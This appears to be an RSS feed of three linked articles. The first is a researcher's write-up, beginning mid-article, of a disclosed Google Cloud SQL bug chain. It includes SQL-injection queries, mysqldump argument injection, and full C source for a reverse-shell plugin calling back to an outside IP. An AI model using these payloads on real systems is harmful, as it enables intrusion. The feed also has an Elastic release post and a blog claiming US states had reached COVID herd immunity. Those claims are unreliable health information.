<p>When looking at the web-interface of the MySQL instance in the Google Cloud console, we notice several features are presented to us. We can create a new database, new users and we can import and export databases from and to storage buckets. While looking at the export feature, we noticed we can enter a custom query when doing an export to a CSV file.&nbsp;</p>



<figure><img src="https://lh5.googleusercontent.com/3aci3M0rgdPVUkEoKwZ1YsSQIM0V0Nr84dwvo1T6k4uIpaxjHLC4tGpT8XPTxBcQpI7Lb9dRhn7lJncD-1AlAxO2WdODMmtQzG7-9dS_5kr2X1Ts7hYiJkUUtA7OXg44BNK7zpMI" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Because we want to know how Cloud SQL is doing the CSV export, we intentionally enter the incorrect query “SELECT * FROM evil AND A TYPO HERE”. This query results in the following error:&nbsp;</p>



<pre><code>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AND A TYPO HERE INTO OUTFILE '/mysql/tmp/savedata-1589274544663130747.csv' CHARA' at line 1</code></pre>



<p>The error clearly shows that the user that is connecting to MySQL to do the export has FILE privileges. It attempts to select data to temporarily store it into the ‘/mysql/tmp’ directory before exporting it to a storage bucket. When we run ‘SHOW VARIABLES’ from our MySQL client we notice that ‘/mysql/tmp’ is the secure_file_priv directory, meaning that ‘/mysql/tmp’ is the only path where a user with FILE privileges is allowed to store files.&nbsp;</p>



<p>By adding the MySQL comment character (#) to the query we can perform SQL injection with FILE privileges:&nbsp;</p>



<pre><code>SELECT * FROM ourdatabase INTO ‘/mysql/tmp/evilfile’ #</code></pre>







<p>An attacker could now craft a malicious database and select the contents of a table but can only write the output to a file under ‘/mysql/tmp’. This does not sound very promising so far.&nbsp;</p>







<h4>Bug 2. Parameter injection in mysqldump</h4>



<p>When doing a regular export of a database we notice that the end result is a .sql file which is dumped by the ‘mysqldump’ tool. This can easily be confirmed when you open an exported database from a storage bucket, the first lines of the dump reveal the command and version:&nbsp;</p>



<pre><code>-- MySQL dump 10.13  Distrib 5.7.25, for Linux (x86_64)
--
-- Host: localhost    Database: mysql
-- ------------------------------------------------------
-- Server version	5.7.25-google-log&lt;!-- wp:html --&gt;
-- MySQL dump 10.13&amp;nbsp; Distrib 5.7.25, for Linux (x86_64)
5.7.25-google-log&lt;/em&gt;&lt;/p&gt;
</code></pre>



<p>Now we know that when we run the export tool, the Cloud SQL API somehow invokes mysqldump and stores the database before moving it to a storage bucket.&nbsp;</p>



<p>When we intercept the API call that is responsible for the export with Burp we see that the database (‘mysql’ in this case) is passed as a parameter:&nbsp;</p>



<figure><img src="https://lh5.googleusercontent.com/kwODJFjPA4RcItjahsAotTJd7YIP2f2PxvsWuObMgjMmdEma0r99rFbotvdEE2Ewb4JgWQcasgneqYyR3xuDwN1kayD7VjC4WJJTnMDXYteWPINj4TXQSNaD-MiHQWa9ZTmcBRld" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>An attempt to modify the database name in the API call from ‘mysql’ into ‘–help’ results into something that surprised us. The mysqldump help is dumped into a .sql file in a storage bucket.&nbsp;</p>



<pre><code>mysqldump  Ver 10.13 Distrib 5.7.25, for Linux (x86_64)
Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

…

Dumping structure and contents of MySQL databases and tables.
Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
OR     mysqldump [OPTIONS] --all-databases [OPTIONS]

...
--print-defaults        Print the program argument list and exit.
--no-defaults           Don't read default options from any option file,
                        except for login file.
--defaults-file=#       Only read default options from the given file #.
</code></pre>



<p>Testing for command injection resulted into failure however. It seems like mysqldump is passed as the first argument to execve(), rendering a command injection attack impossible.&nbsp;</p>



<p>We now can however pass arbitrary parameters to mysqldump as the ‘–help’ command illustrates.&nbsp;</p>



<h4>Crafting a malicious database</h4>



<p>Among a lot of, in this case, useless parameters mysqldump has to offer, two of them appear to be standing out from the rest, namely the ‘–plugin-dir’ and the ‘–default-auth’ parameter.&nbsp;</p>



<p>The –plugin-dir parameter allows us to pass the directory where client side plugins are stored. The –default-auth parameter specifies which authentication plugin we want to use. Remember that we could write to ‘/mysql/tmp’? What if we write a malicious plugin to ‘/mysql/tmp’ and load it with the aforementioned mysqldump parameters? We must however prepare the attack locally. We need a malicious database that we can import into Cloud SQL, before we can export any useful content into ‘/mysql/tmp’. We prepare this locally on a MySQL server running on our desktop computers.&nbsp;</p>



<p>First we write a malicious shared object which spawns a reverse shell to a specified IP address. We overwrite the <em>_init</em> function:</p>



<pre><code>#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netinet/ip.h&gt;

void _init() {
  FILE * fp;
  int fd; 
  int sock; 
  int port = 1234; 
 
  struct sockaddr_in addr;
  char * callback = "123.123.123.123";
  char mesg[]= "Shell on speckles&gt;\n";
  char shell[] = "/bin/sh";
  
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr(callback);
  fd = socket(AF_INET, SOCK_STREAM, 0);
  connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr));

  send(fd, mesg, sizeof(mesg), 0);

  dup2(fd, 0); 
  dup2(fd, 1); 
  dup2(fd, 2); 
  execl(shell, "sshd", 0, NULL);     
  close(fd);
}

</code></pre>



<p>We compile it into a shared object with the following command:&nbsp;</p>



<pre><code>gcc -fPIC -shared -o evil_plugin.so evil_plugin.c -nostartfiles</code></pre>



<p>On our locally running database server, we now insert the evil_plugin.so file into a longblob table:&nbsp;</p>



<pre><code>mysql -h localhost -u root

&gt;CREATE DATABASE files
&gt;USE files
&gt; CREATE TABLE `data` (
  `exe` longblob
) ENGINE=MyISAM DEFAULT CHARSET=binary;
&gt; insert into data VALUES(LOAD_FILE('evil_plugin.so'));
</code></pre>



<p>Our malicious database is now done! We export it to a .sql file with mysqldump:&nbsp;</p>



<pre><code>Mysqldump -h localhost -u root files &gt; files.sql </code></pre>



<p>Next we store files.sql in a storage bucket. After that, we create a database called ‘files’ in Cloud SQL and import the malicious database dump into it.&nbsp;</p>







<h4>Dropping a Shell</h4>



<p>With everything prepared, all that’s left now is writing the evil_plugin.so to /mysql/tmp before triggering the reverse shell by injecting ’–plugin-dir=/mysql/tmp/ –default-auth=evil_plugin’ as parameters to mysqldump that runs server-side.&nbsp;</p>



<p>To accomplish this we once again run the CSV export feature, this time against the ‘files’ database while passing the following data as it’s query argument:&nbsp;</p>



<pre><code>SELECT * FROM data INTO DUMPFILE '/mysql/tmp/evil_plugin.so' #</code></pre>



<p>Now we run a regular export against the MySQL database again, and modify the request to the API with Burp to pass the correct parameters to mysqldump:&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/NFhsohbW98RToBXX1fwFHTp7Pv2Hg-XOhVxZ-l3QIAJ9GErN9-0Ow6uLZEV9cECMfrmEpazLJ8ERif6ByFsyk9nCe3gyw7LDgPjiy5CikoZq9Dnx1f45u9l_I5fbJnn9zhIg7yXW" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Success! On our listening netcat we are now dropped into a reverse shell.</p>



<figure><img src="https://lh3.googleusercontent.com/mLDA_770OLgc61AkO-XGHnPmt1wOjftaDOaeOxfHXmw3CxcbqbxgBs-jK0xm_gl8H9QFIWP7AKoTQe8bIZP3kgMA-hPhUhZGtS1Oz2cC4i46tYIbLv-nxL8x9C6WMrtO4QofC7YI" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>











<h4>Fun fact</h4>



<p>Not long after we started exploring the environment we landed our shell in we noticed a new file in the /mysql/tmp directory named ‘greetings.txt’:&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/fj27Jhwn7tUZH6GpC6mwbGtXqUuUg48oZ_f3Qk6qsFt0wPu9wUVH5816sm2S5W39BSwEltr8mfAqTkEO2UAGszDe8wmh8rt7Yxv7DHUuR9TOT-_7Mphyh_xg8CdjUhgwTuX8fOP_" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Google SRE (Site Reliability Engineering) appeared to be on to us 🙂 It appeared that during our attempts we crashed a few of our own instances which alarmed them. We got into touch with SRE via e-mail and informed them about our little adventure and they kindly replied back.</p>



<p>However our journey did not end here, since it appeared that we are trapped inside a Docker container, running nothing more than the bare minimum that’s needed to export our database. We needed to find a way to escape and we needed it quickly, SRE knows what we are doing and now Google might be working on a patch.&nbsp;</p>







<h4>Escaping to the host</h4>



<p>The container that we had access to was running unprivileged, meaning that no easy escape was available. Upon inspecting the network configuration we noticed that we had access to eth0, which in this case had the internal IP address of the container attached to it.&nbsp;</p>



<figure><img src="https://lh4.googleusercontent.com/3eETAGk9NxxcfxY1CUeJs7kfXHGA-3HuVWqBGSm9WntJAa1i_t7F2Wl4U4slOmUDXBtu43aE-he79tJCvr14_DXLPtz-Gc2C2OLDXrZlAxklFvx9W0TjfqKR4xA0V7qa0owJTI0g" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>This was due to the fact that the container was configured with the Docker host networking driver (–network=host). …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/">https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/</a></em></p>]]>
            </description>
            <link>https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24216009</guid>
            <pubDate>Wed, 19 Aug 2020 20:32:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elastic 7.9]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 22 (<a href="https://news.ycombinator.com/item?id=24215850">thread link</a>) | @praseodym
<br/>
August 19, 2020 | https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We are pleased to announce the general availability of Elastic 7.9. This release brings a broad set of new capabilities to our Elastic Enterprise Search, Observability, and Security solutions, which are built on the Elastic Stack — Elasticsearch, Kibana, Logstash, and Beats. 7.9 delivers significant new capabilities to market, transforming the ways in which our customers and users onboard data into Elastic with the new Elastic Agent, launching a&nbsp;free distribution tier of features of Elastic Workplace Search, part of Elastic Enterprise Search, and, in Elastic Security, introducing the beta&nbsp;of a&nbsp;free distribution tier of endpoint security,&nbsp;featuring malware prevention directly integrated into the Elastic Stack, the first major milestone in delivering comprehensive, integrated endpoint security.&nbsp;<br></p><p>We are also continuing to improve the capabilities of Elastic Cloud, the best place to deploy the Elastic Stack and our solutions. In the last few months, we have launched support for AWS PrivateLink connectivity, achieved FedRAMP Moderate authorization, simplified buying options, and launched support for three new regions. And, of course, Elastic 7.9 is available right now on <a href="https://cloud.elastic.co/registration?">Elastic Cloud</a>&nbsp;— the only managed Elasticsearch offering to include all of the new features in 7.9. Or you can <a href="https://www.elastic.co/downloads">download</a> the Elastic Stack and our cloud orchestration products, Elastic Cloud Enterprise and Elastic Cloud for Kubernetes, for a self-managed experience.
</p><p><img src="https://play.vidyard.com/ehpdxVj6zpiN83ietFNzKZ.jpg" data-uuid="ehpdxVj6zpiN83ietFNzKZ" data-v="4" data-type="inline" data-autoplay="1" data-loop="1" disable_analytics="1" data-hidden_controls="1" data-muted="0" muted=""></p><p>This is a packed release, and we are excited to share some of the key release highlights below. To get the full feature rundown, dive into the individual solution and product blog posts, but for now, let’s dig in.<br></p><h2>Introducing a new free way to get started with Workplace Search, part of Elastic Enterprise Search</h2><h3>Welcoming features of Workplace Search to our&nbsp;free distribution tier</h3><p>Following the general availability of Workplace Search in 7.7 and its subsequent availability in Elastic Cloud, features of Workplace Search are&nbsp;now available as part of the Basic free distribution tier. Get started on boosting your team’s productivity by unifying all your content platforms like Google Drive, Gmail, Salesforce, SharePoint, Jira, and more into a personalized search experience for your organization. This free tier&nbsp;includes connectors for all supported content sources, access to the custom API for creating your own connectors, group and user management features, and tools for building modern search user experiences.
</p><p>Workplace Search is available for free, with additional features available with Platinum or Enterprise subscriptions. Workplace Search can be used on Elastic Cloud or can be deployed as a self-managed option on your own infrastructure with the Elastic Stack.
</p><h3>Viewing Elastic Enterprise Search through Kibana</h3><p>As the window into the Elastic Stack, Kibana allows users to take data from any source, in any format, and search, analyze, and visualize that data in real time. Elastic Enterprise Search is now available in Kibana to provide users with easy navigation to App Search and Workplace Search from a familiar starting point. With this release, Kibana admins can customize spaces to show or hide Elastic Enterprise Search in the main navigation menu. In this release, App Search users can access all their engines and meta engines from Kibana, while Workplace Search users can access user management and content source synchronization tooling.
</p><h3>Supercharging email searching capabilities with Gmail support in Workplace Search</h3><p>Email is the central hub of business communication, and a huge proportion of our daily insights gets siloed into email archives over time. With 7.9, Workplace Search supports Gmail as a connector. Each individual Gmail user can easily use the clean, intuitive Workplace Search user interface to search within their own email and see results right alongside all their other content sources.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt92151efa7e2f7735/5f2b35d5d9a24d7c67e4f376/Enterprise_Search_7.9_Gmail_connector.jpg" data-sys-asset-uid="blt92151efa7e2f7735" alt="Enterprise_Search_7.9_Gmail_connector.jpg" width="705" height="612"><br></p><figcaption>Workplace Search support for Gmail as a connector in Elastic Enterprise Search 7.9
</figcaption><h3>Giving more control and automation over scaling your deployments, plus new insight from source activity logs</h3><p>Because Elastic Enterprise Search is built on the Elastic Stack, powerful features can be pulled into App Search and Workplace Search based on user needs. In 7.9, App Search and Workplace Search inherit index lifecycle management (ILM) policies from the Elastic Stack. Users can configure ILM policies to automatically manage indexes (engines) according to user requirements. Examples include: creating a new index once it reaches a predefined size; creating or archiving an index each day, week, or month; and deleting indices based on data retention rules. Create and manage ILM policies directly inside App Search.
</p><p>Get a scoop on all of the new Elastic Enterprise Search features in the <a href="https://www.elastic.co/blog/whats-new-elastic-enterprise-search-7-9-0-free-workplace-search-kibana-access">Elastic Enterprise Search 7.9 blog</a>.&nbsp;
</p><h2>Delivering a single unified agent with one-click data ingestion</h2><h3>Ingesting data for observability gets a lot simpler with Elastic Agent and Ingest Manager</h3><p>Onboarding data is a critical — and often time-consuming and tedious — step in observability workflows. How quickly can we go from deciding to monitor a system to actually monitoring the system? How easy is it to instrument the system? Is the collected data parsed and structured to be usable? How quickly can we visualize and glean key insights from the data? Now multiply this by the thousands of components in your technology stack — servers, VMs, containers, applications, databases, middleware, etc. — and the operational aspects become critical.&nbsp;
</p><p>We are excited to introduce a dramatically simplified data onboarding and ingest management workflow with the launch of several new ingest capabilities in 7.9. Our goal with this initiative is to streamline the entire ingest process so that operators can spend more time acting on insights and less time setting and managing their ingest process. The Elastic Agent, in beta in 7.9, is a single, unified way to collect all kinds of data from a host, including logs, metrics, and endpoint security data, with plans to expand to APM and other data types in the future. Having a single agent to install, configure, update, and maintain is a huge efficiency boost for operators. Ingest Manager, which is also in beta in 7.9, controls all aspects of your ingest universe from a central place. Add and manage integrations for popular services and platforms: we plan to port all 100+ Beats modules over the next few releases. Finally, you can centrally manage all your agents with Fleet — the control tower for all deployed agents. A typical enterprise will usually have agents deployed on tens of thousands of hosts, and Fleet makes it easy for operators to manage this spread from a single place.&nbsp;
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt14a7b1c489c7b329/5f318d4b48bdc47f3f1e6dc0/7.9-agent-ingest.gif" data-sys-asset-uid="blt14a7b1c489c7b329" alt="7.9-agent-ingest.gif" width="759" height="427"></p><figcaption>Simplified data ingest with Elastic Agent and Ingest Manager in Elastic 7.9</figcaption><h3>Enhancing analyst experience with a unified observability overview page</h3><p>Unification of the three data pillars of observability — logs, metrics, and traces — at the data layer is one of the features that sets Elastic Observability apart. Having all the data in a single datastore is essential to supporting investigative workflows that seamlessly move between data streams to speed mean time to resolution.&nbsp;
</p><p>Building on this unified data foundation, we are excited to extend unification to the visualization layer with the launch of a new observability overview page in Kibana. The overview page bubbles up key information across all your observability data — logs, metrics, APM, uptime — and presents a curated at-a-glance view of the health of your entire ecosystem. This out-of-the-box view helps you get to insights faster — especially for new users or new deployments. The overview page includes a newsfeed that keeps you informed of product updates and news.&nbsp;
</p><h3>Embracing open standards with OpenTelemetry integration in Elastic APM&nbsp;</h3><p>From open code to open community, Elastic is built on openness and transparency. That mindset extends to our support for open standards in the observability space, such as OpenTracing, Jaeger, and W3C Trace-Context. We are happy to add the recently formed OpenTelemetry standard to that list. OpenTelemetry is a Cloud Native Computing Foundation (CNCF) sandbox project, currently in beta, that provides vendor-neutral, language-specific agents, SDKs, and APIs to collect distributed traces, metrics, and log data from monitored applications. We have added the Elastic APM exporter (and contributed it to the OpenTelemetry collector contrib repo), which takes the trace data collected using the OpenTelemetry collector, translates it to Elastic-compatible protocol, and sends it to Elastic APM. This means that you can start exploring your OpenTelemetry using Elastic APM without any changes to your instrumentation. Just add the Elastic exporter, currently in beta, into your OpenTelemetry setup and start exploring your data in minutes.&nbsp;
</p><h3>Strengthening ties between DevOps and SecOps with 50+ turnkey detection rules&nbsp;</h3><p>While you observe, why not protect? Logs, metrics, and traces from applications and infrastructure collected by observability teams are a rich source of information for security teams. The benefit of having Elastic Security and Elastic Observability sit on top of the same Elasticsearch data is that you can ask different questions of the same data without duplicating it across tools. Elastic caters to the needs of both SecOps and DevOps teams, fostering collaboration. Our unified resource-based pricing means that adding different lenses to the same data doesn’t come at an additional cost.&nbsp;
</p><p>In 7.9, we are strengthening the bond between Elastic Security and Elastic Observability even more with the beta launch of over 50 turnkey detection rules that allow both DevOps teams and security analysts to benefit from insights for hundreds of services and systems in minutes — with no extra work or cost. And of course, with the flexible detection engine you are welcome to create additional rules to fit your environment.
</p><p>Dive deeper in all the new features in the <a href="https://www.elastic.co/blog/whats-new-elastic-observability-7-9-0-unified-agent-kpi-overview-dashboard">Ela…</a></p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security">https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security</a></em></p>]]>
            </description>
            <link>https://www.elastic.co/blog/whats-new-in-elastic-7-9-0-free-workplace-search-engine-endpoint-security</link>
            <guid isPermaLink="false">hacker-news-small-sites-24215850</guid>
            <pubDate>Wed, 19 Aug 2020 20:23:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I believe the US has herd immunity in some states]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 162 (<a href="https://news.ycombinator.com/item?id=24215572">thread link</a>) | @gloriosoc
<br/>
August 19, 2020 | https://realscience.community/2020/08/17/why-i-believe-the-us-has-herd-immunity-in-some-states-and-is-barreling-towards-it-as-a-country/ | <a href="https://web.archive.org/web/*/https://realscience.community/2020/08/17/why-i-believe-the-us-has-herd-immunity-in-some-states-and-is-barreling-towards-it-as-a-country/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p><strong>First a disclaimer before everyone yells at me, which keeps happening when I bring up herd immunity:</strong></p>



<p>Herd immunity is not a dirty word. It is a scientific phenomenon. Data are what data are, to quote <a href="https://neuroscience.med.umich.edu/directory/faculty/richard-hume">Professor Richard Hume</a>, my college molecular neurobiology professor at Umich. You can blame him as he is the reason that I decided to do a neuroscience PhD, which eventually led me down the winding path that brought me to writing this blog post. Sorry Dr. Hume. I am not talking about this because I am a republican or a democrat. I am not trying to convince people to not wear masks or social distance (please still do those things, they work). I am bringing this up because information is power. It’s power to make more intelligent decisions about our own personal lives and about policy. I am also bring this up because it’s interesting. Whether there is herd immunity or not is basically the trillion dollar question in this whole pandemic. It speaks to how long this will last, whether vaccines will work, and how much more torture we all have to endure. </p>



<p><strong>Ok so back to it.</strong></p>



<p>I am going to start with the states hit hardest before we shut down (or sort of shut down), New York and New Jersey. These states have not seen a second wave, which btw, is a misnomer, it’s really a continuation of the first wave that got interrupted. The Hopkins dashboard map has states color coded by redder (increasing), white (stable), and green (decreasing). </p>



<figure><img loading="lazy" width="1024" height="719" src="https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-1024x719.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-1024x719.png 1024w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-300x211.png 300w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-768x539.png 768w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-1200x842.png 1200w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-855x600.png 855w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins-960x674.png 960w, https://realscience.community/wp-content/uploads/2020/08/ny-nj-hopkins.png 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://coronavirus.jhu.edu/data/new-cases-50-states">Hover Map From JHU</a></figcaption></figure><p>I believe the reason that NY and NJ are not increasing, is that they achieved herd immunity before the shut down. I have been saying this for a long time now. A few months ago I said “let’s do a <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> experiment- if NY has herd immunity cases won’t go up with reopening”. Well here are the results- NY, not going up. There really is no other explanation I can think of for this besides herd immunity. New York City has not somehow become less populous. And neither state is being super careful. I have been to both of them in the last month. Jersey shore has packed beaches with very few people wearing masks. The below pic is from May 16th 2020 in Ocean City, NJ. So being really vigilant at social distancing and mask wearing is NOT the reason their numbers are staying low.</p>



<figure><img loading="lazy" width="1024" height="874" src="https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-1024x874.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-1024x874.png 1024w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-300x256.png 300w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-768x656.png 768w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-1200x1024.png 1200w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-703x600.png 703w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ-960x820.png 960w, https://realscience.community/wp-content/uploads/2020/08/Ocean-City-NJ.png 1312w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Here is a detailed view of New York’s daily new cases, which peaked on April 9th, descended to a crawl, and haven’t increased since.</p>



<figure><img loading="lazy" width="1024" height="772" src="https://realscience.community/wp-content/uploads/2020/08/New-York-1024x772.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/New-York-1024x772.png 1024w, https://realscience.community/wp-content/uploads/2020/08/New-York-300x226.png 300w, https://realscience.community/wp-content/uploads/2020/08/New-York-768x579.png 768w, https://realscience.community/wp-content/uploads/2020/08/New-York-200x150.png 200w, https://realscience.community/wp-content/uploads/2020/08/New-York-1200x905.png 1200w, https://realscience.community/wp-content/uploads/2020/08/New-York-796x600.png 796w, https://realscience.community/wp-content/uploads/2020/08/New-York-960x724.png 960w, https://realscience.community/wp-content/uploads/2020/08/New-York.png 1300w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://coronavirus.jhu.edu/data/new-cases-50-states/new-york">New York State, Daily New Cases.</a> </figcaption></figure><p>Next, let’s take a look at the States that have had a sharp second peak after reopening, Texas, Florida, Arizona, and Louisiana. After a huge increase in cases post reopening, these states now have decreasing numbers. You can see they are green or white. </p>



<figure><img loading="lazy" width="1024" height="719" src="https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-1024x719.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-1024x719.png 1024w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-300x211.png 300w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-768x539.png 768w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-1200x842.png 1200w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-855x600.png 855w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx-960x674.png 960w, https://realscience.community/wp-content/uploads/2020/08/la_az_fl_tx.png 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://coronavirus.jhu.edu/data/new-cases-50-states">Hover Map From JHU</a></figcaption></figure><p>Let’s take a closer look at Florida for instance. </p>



<figure><img loading="lazy" width="1024" height="743" src="https://realscience.community/wp-content/uploads/2020/08/Florida-1024x743.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/Florida-1024x743.png 1024w, https://realscience.community/wp-content/uploads/2020/08/Florida-300x218.png 300w, https://realscience.community/wp-content/uploads/2020/08/Florida-768x557.png 768w, https://realscience.community/wp-content/uploads/2020/08/Florida-1200x870.png 1200w, https://realscience.community/wp-content/uploads/2020/08/Florida-827x600.png 827w, https://realscience.community/wp-content/uploads/2020/08/Florida-960x696.png 960w, https://realscience.community/wp-content/uploads/2020/08/Florida.png 1332w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://coronavirus.jhu.edu/data/new-cases-50-states/florida">Florida, Daily New Cases</a></figcaption></figure><p>Unlike New York, Florida saw barely any cases before shut down. After reopening, it saw huge numbers of cases, peaking on July 12th. Why would Floridas numbers start to decrease if not for herd immunity? We know they aren’t being more careful. Disney land reopened and there is a <a href="https://www.youtube.com/watch?v=V81RqCKQwvg">police sheriff who literally made a rule that police officers and people going into the station were not allowed to wear masks</a>. </p>



<p>Now let’s take a look at total percent infections in the US by state.</p>



<figure><img loading="lazy" width="1024" height="635" src="https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-1024x635.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-1024x635.png 1024w, https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-300x186.png 300w, https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-768x476.png 768w, https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-968x600.png 968w, https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections-960x595.png 960w, https://realscience.community/wp-content/uploads/2020/08/Percent-Total-infections.png 1084w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Estimated Percent of the State Infected.</figcaption></figure><p>You can see that the States with the most total infections are the states that either haven’t had a second peak (NY, NJ) or have just gotten through a huge peak and are now on the down swing (LA, FL, AZ). I believe that this is because they either were or are now herd immune. If you have another explanation, I am all ears, but I really can’t think of one. I think when all states turn as red as Florida, we will as a country be herd immune. </p>



<p>So, say that I am correct about this, what does that mean? Well for one thing, we should be using this to guide reopening and school attendance. There are definitely some places that are safer than others. And for the love of god, let New York City folks out of jail a little bit. The Bronx is one of the safest places in the country right now. It is down right morbidly depressing in NYC because people are still so traumatized and worried. That isn’t to say that it is completely safe- it’s not- herd immunity just means that it is more safe- not totally safe. </p>



<p>For another thing, this means that this pandemic will be over soonish. If the whole country is herd immune, which could happen in a few months, then the pandemic is over for as long as antibodies last regardless of whether we have vaccine or not.  </p>



<p>This gets me to my last piece of positive news with this. New York peaked on April 9th, four months ago. If they are herd immune, then immunity lasts at least four months. This is all pretty encouraging for vaccines and for not having this pandemic last forever. Cheers. </p>



<p><strong>**** This analysis and the conclusions that I have drawn are my own and do not necessarily reflect the opinions of the wider scientific and medical communities. Please still be cautious with your health and the health of any at risk people you encounter</strong>. <strong>And for the love of god, wear a mask.</strong></p>



	<div data-blog-id="180687771">
		<div>
			<form aria-describedby="wp-block-jetpack-mailchimp_consent-text">
				
												

				<p id="wp-block-jetpack-mailchimp_consent-text">
